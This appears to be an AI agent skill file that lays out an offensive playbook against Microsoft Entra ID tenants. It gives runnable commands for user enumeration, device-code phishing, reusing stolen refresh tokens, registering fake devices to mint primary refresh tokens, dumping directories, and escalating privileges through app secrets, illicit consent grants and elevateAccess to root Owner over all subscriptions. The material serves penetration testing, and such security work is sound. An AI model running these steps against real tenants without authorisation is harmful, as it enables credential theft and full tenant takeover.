---
name: azure-entra-id
description: Attack the Microsoft Entra ID (Azure AD) identity plane — unauthenticated tenant/user recon, authenticated directory enumeration with ROADtools/AzureHound/AADInternals, token acquisition and exchange with roadtx (PRT, FOCI, device registration), and Entra privilege escalation into Azure RBAC. Use whenever an engagement touches a Microsoft 365 / Azure tenant's directory; sibling to azure-enumeration (ARM/resource plane).
license: Apache-2.0
metadata:
  author: Section9Labs
  domain: cloud
---

# Entra ID (Azure AD) — directory attack skill

This skill covers the **identity plane**: the tenant directory, its principals, roles,
apps, tokens and trust relationships. The **resource plane** (ARM, subscriptions, VMs,
storage) is `azure-enumeration`; chase harvested credentials with
`cloud-credential-enumeration`; convert footholds with `cloud-privilege-escalation`;
umbrella skill: `cloud-security`.

Workflow: **outsider recon → get a token → dump the directory → map privesc edges →
escalate → pivot to ARM**.

## Phase 0 — Unauthenticated / pre-auth tenant recon

Everything here is anonymous HTTP against Microsoft login endpoints. Start with the
bundled script, then widen with the tools.

```
python3 scripts/entra_recon.py example.com --federation \
    --userfile users.txt -o out/entra-recon.json --units out/recon-units.json
```

What it hits and what to read:

- `https://login.microsoftonline.com/example.com/.well-known/openid-configuration`
  — if the domain belongs to a tenant you get the **tenant GUID** (in
  `token_endpoint` / `issuer`) and `tenant_region_scope`. HTTP 400 = domain not in
  any tenant.
- `https://login.microsoftonline.com/getuserrealm.srf?login=user@example.com&json=1`
  — `NameSpaceType`: `Managed` (cloud auth — password spray against Entra works),
  `Federated` (ADFS/third-party IdP — `AuthURL` is the federation endpoint, attack
  that instead or look for seamless-SSO), `Unknown` (no tenant).
- `GetCredentialType` (`https://login.microsoftonline.com/common/GetCredentialType`)
  — per-username existence oracle: `IfExistsResult` 0/5/6 = user exists, 1 = no.
  This is what the script's `--user/--userfile` validation uses, and what
  o365creeper-style enumerators wrap.
- Autodiscover `GetFederationInformation` (SOAP, `--federation`) — returns **every
  domain registered to the tenant**, including the immutable
  `<name>.onmicrosoft.com`, with zero auth.

Tooling for the same ground, run in parallel:

```powershell
# AADInternals — full outsider recon: tenant id, brand, all domains, DesktopSSO
Invoke-AADIntReconAsOutsider -DomainName example.com | Format-Table
# User enumeration (normal = GetCredentialType, also 'login' and 'autologon' methods)
Invoke-AADIntUserEnumerationAsOutsider -UserName "admin@example.com"
Get-Content users.txt | Invoke-AADIntUserEnumerationAsOutsider -Method Normal
```

```powershell
# MicroBurst — tenant-related public services + storage account / blob guessing
Invoke-EnumerateAzureSubDomains -Base example -Verbose
Invoke-EnumerateAzureBlobs -Base example -OutputFile blobs.txt
```

```
# cloud_enum — Azure (plus AWS/GCP) public resource brute-force
cloud_enum -k example -k example.com --disable-aws --disable-gcp -l cloud_enum.txt
```

Hits on storage/blob endpoints hand off to `azure-enumeration` (anonymous blob
access) and anything that yields credentials to `cloud-credential-enumeration`.
The script writes a bare JSON array of work units to `out/recon-units.json`
(tenant facts, validated users, federated domain list) — see `references/rupu.md`.

## Phase 1 — Get a token (roadtx)

Any Entra credential becomes a token; any token for one FOCI client becomes a token
for all of them. roadtx (part of ROADtools) is the swiss-army knife; full flag
reference in `references/tooling.md`.

```bash
# Username/password (ROPC) — default client is Azure AD PowerShell (FOCI member)
roadtx gettokens -u user@example.com -p 'Passw0rd!' -r https://graph.microsoft.com/
# Device-code phish / self-auth
roadtx gettokens --device-code -c msteams
# You already have a refresh token (from a cache, LSASS, TokenSmith, etc.)
roadtx gettokens --refresh-token <RT> -c azcli -r https://management.azure.com/
# FOCI pivot: swap the cached RT to a different first-party client + resource
roadtx refreshtokento -c msedge -r msgraph
roadtx refreshtokento -c azcli  -r azrm      # ARM token for the az-handoff below
```

Tokens land in `.roadtools_auth` (JSON: `accessToken`, `refreshToken`, tenant).
Decode claims with `roadtx describe < .roadtools_auth` — check `scp`/`roles`,
`amr` (did it pass MFA?), `aud`.

**PRT / device track** (turns one credential into a persistent, MFA-claim-bearing
primary refresh token):

```bash
roadtx device -a register -n DESKTOP-EXAMPLE          # join/register a fake device
roadtx prt -u user@example.com -p 'Passw0rd!' \
    -c DESKTOP-EXAMPLE.pem -k DESKTOP-EXAMPLE.key     # request PRT (.roadtools_prt)
roadtx prtauth -c msedge -r msgraph                   # mint tokens from the PRT
roadtx browserprtauth --url https://portal.azure.com  # PRT-cookie browser session
roadtx prtenrich -u user@example.com                  # add MFA claim via NGC/other
```

AADInternals equivalents: `Get-AADIntUserPRTToken` (from a joined box),
`Join-AADIntDeviceToAzureAD`, `New-AADIntUserPRTToken`. Conditional-access gaps
found in Phase 3 tell you which client/platform combination to impersonate.

## Phase 2 — Authenticated directory enumeration

### ROADrecon — the full directory, offline

```bash
roadrecon auth -u user@example.com -p 'Passw0rd!'      # or --device-code,
                                                       # --access-token, --refresh-token
roadrecon gather --mfa                                 # dump directory -> roadrecon.db
roadrecon gui                                          # browse at http://127.0.0.1:5000
roadrecon plugin policies                              # conditional access -> caps.html
```

**AAD Graph retirement caveat (check this first):** classic `roadrecon gather`
talks to the legacy Azure AD Graph (`graph.windows.net`), which Microsoft is
retiring; tenants increasingly return 403/`Application ... is retired`. If gather
fails that way: (1) upgrade — `pip install -U roadrecon roadtx roadlib` — and read
the ROADtools README for current MS Graph support; (2) try the `msgraph`
branch/community Graph-API forks (`pip install git+https://github.com/dirkjanm/ROADtools@<branch>#subdirectory=roadrecon`)
— **behavior varies by fork**: some tables (notably `policies`, device details,
`oauth2permissiongrants`) may be partial or renamed, so sanity-check with
`sqlite3 roadrecon.db ".tables"` and row counts before trusting the data; (3) fall
back to AzureHound + raw MS Graph (`az rest`/curl with a Graph token). Details in
`references/tooling.md`.

### AzureHound — BloodHound attack paths

```bash
azurehound list -u 'user@example.com' -p 'Passw0rd!' --tenant <tenant-id-or-domain> -o azurehound.json
# or ride a stolen token:
azurehound list --refresh-token <RT> --tenant <tenant-id> -o azurehound.json
azurehound list --jwt <access-token>  --tenant <tenant-id> -o azurehound.json
# or as a service principal you control:
azurehound list -a <app-id> -s <client-secret> --tenant <tenant-id> -o azurehound.json
```

`list` with no subcommand collects everything (Entra + ARM). Import
`azurehound.json` into BloodHound (CE: file upload / API) and hunt `AZ*` edges.
Then split it into work units:

```
python3 scripts/parse_azurehound.py azurehound.json \
    -o out/work-units.json --assets out/assets.json
```

This emits one unit per privesc edge / high-value principal (GA holders,
Privileged Role Admins, app/SP/group owners, role-assignable groups, SPs holding
dangerous Graph app roles) — the file is a bare JSON array for rupu `for_each:`
(`references/rupu.md`).

### AADInternals — insider recon + the odd corners

```powershell
Get-AADIntAccessTokenForMSGraph -SaveToCache     # or ...ForAADGraph / ...ForAzureCoreManagement
Invoke-AADIntReconAsInsider                      # tenant settings, roles, sync status
Get-AADIntUsers; Get-AADIntTenantDetails; Get-AADIntConditionalAccessPolicies
Get-AADIntAzureADPolicies                        # incl. B2B / authorization policy
```

## Phase 3 — Reading the data

**roadrecon.db** (SQLite): key tables `Users`, `Groups` (check
`isAssignableToRole`, `membershipRule` for dynamic groups), `ServicePrincipals`
(+ `passwordCredentials`/`keyCredentials` — existing creds!), `Applications`,
`AppRoleAssignments` (SP → Graph app roles), `OAuth2PermissionGrants` (delegated
consents — illicit-grant surface), `DirectoryRoles` + link tables (`lnk_role_member_*`),
`Devices`, `Policies`. Example triage queries are in `references/entra-privesc.md`.

**BloodHound AZ edges** to hunt: `AZGlobalAdmin`, `AZPrivilegedRoleAdmin`,
`AZAddMembers`/`AZAddOwner`, `AZOwns`, `AZAppAdmin`/`AZCloudAppAdmin`,
`AZAddSecret`, `AZExecuteCommand` (Intune), `AZResetPassword`,
`AZMGGrantAppRoles`/`AZMGAddSecret` (Graph app-role abuse), `AZRunsAs`,
`AZUserAccessAdministrator`/`AZOwner`/`AZContributor` (ARM side). Query:
shortest paths from owned principals to `AZTenant`/Global Admin.

**Conditional access gaps** (`roadrecon plugin policies` → `caps.html`): excluded
users/groups ("break-glass" accounts), untargeted apps, missing platforms (Linux,
legacy auth), location-only MFA (egress via an in-scope VPN/VM), report-only
policies. Every gap is a token-acquisition route for Phase 1.

## Phase 4 — Privilege escalation (catalog: `references/entra-privesc.md`)

The primitives, each with exact commands in the reference:

1. **App/SP ownership → add credential → act as the SP** (Graph
   `addPassword` on the application or service principal, then
   client-credentials auth). Deadly when the SP holds
   `RoleManagement.ReadWrite.Directory` or `AppRoleAssignment.ReadWrite.All`.
2. **Application Admin / Cloud App Admin role** = `addSecret` on *any* app/SP.
3. **Group-based**: owner of a **role-assignable group** or member via a
   **dynamic group rule** you can satisfy (e.g. rule on `otherMails`/`userPrincipalName`
   you can set) → inherit the group's directory role.
4. **Privileged Role Administrator / partner (GDAP) relationships** → assign
   yourself Global Admin.
5. **Password reset chains**: Authentication Admin / Helpdesk Admin / User Admin
   over non-admins and some admin tiers; mind **administrative-unit scoping**
   (an AU-scoped role is still a full role over the AU's members — and
   restricted-management AUs can *hide* targets from you).
6. **Illicit consent grant**: register an app, lure or admin-consent dangerous
   delegated scopes; or with `AppRoleAssignment.ReadWrite.All`, grant *yourself*
   app roles without any admin role.
7. **Global Admin → Azure RBAC**: toggle *Access management for Azure resources*:

```bash
az rest --method post \
  --url "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?action=elevateAccess&api-version=2016-09-01"
```

   → you become **User Access Administrator at root (`/`)** over every
   subscription; then `az role assignment create --assignee <you> --role Owner --scope /`.

## Handoff — identity plane → resource plane

A Graph foothold drives ARM directly:

```bash
roadtx refreshtokento -c azcli -r azrm           # ARM access token in .roadtools_auth
az login --tenant <tenant-id> ...                # or feed az via service principal:
az login --service-principal -u <app-id> -p <secret> --tenant <tenant-id>
az account list; az rest --url https://graph.microsoft.com/v1.0/me
```

- Subscriptions/resources visible → **`azure-enumeration`**.
- Managed identities, Key Vaults, automation creds, VM run-command →
  **`cloud-privilege-escalation`**.
- Any secret/credential found anywhere (SP passwords in roadrecon.db, Key Vault,
  app settings) → **`cloud-credential-enumeration`**.
- Report back through the **`cloud-security`** umbrella.

Every parse step above ends in a rupu-ingestible file:
`out/recon-units.json` (Phase 0), `out/work-units.json` + `out/assets.json`
(Phase 2). Fan-out wiring, `assets.mark`, and `findings.report` usage:
`references/rupu.md`.
